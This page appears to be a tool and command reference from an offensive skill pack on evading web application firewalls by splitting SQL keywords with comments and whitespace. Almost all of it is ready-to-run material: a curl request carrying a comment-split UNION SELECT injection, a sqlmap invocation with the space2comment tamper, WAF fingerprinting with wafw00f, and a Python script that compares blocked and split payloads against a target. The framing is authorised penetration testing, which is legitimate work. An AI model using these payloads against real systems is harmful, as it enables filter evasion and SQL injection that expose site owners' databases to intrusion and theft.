# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`waf-bypass-and-payload-obfuscation-comment-and-whitespace`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -i -G 'https://target.example/item' --data-urlencode 'id=1/**/UNION/**/SELECT/**/NULL'` | Send the comment-split keyword to test whether the token rule is evaded | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/item?id=1' --tamper=space2comment --technique=U --batch` | Apply the comment-substitution tamper while keeping to the union technique for confirmation | Linux, macOS, Windows |
| `wafw00f` | `wafw00f https://target.example/` | Identify the WAF so its comment and whitespace normalization behavior is known | Linux, macOS, Windows |
| `Burp Suite Intruder` | `Position separators inside the keyword and iterate a separator list` | Sweep comment and whitespace variants against the single blocked token | Cross-platform |

## Minimal Script Shape

Sends the contiguous keyword and a comment-split form to the same parameter and reports a suspected token-rule bypass when the contiguous form is blocked but the split form is not.

```python
import urllib.parse
import urllib.request

URL = "https://target.example/item"

def send(value):
    q = urllib.parse.urlencode({"id": value})
    req = urllib.request.Request(URL + "?" + q, headers={"User-Agent": "authorised-assessment"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

contiguous = send("1 UNION SELECT NULL")
comment_split = send("1/**/UNION/**/SELECT/**/NULL")
print({"contiguous_status": contiguous, "comment_split_status": comment_split,
       "token_rule_bypass_suspected": contiguous == 403 and comment_split != 403})
```
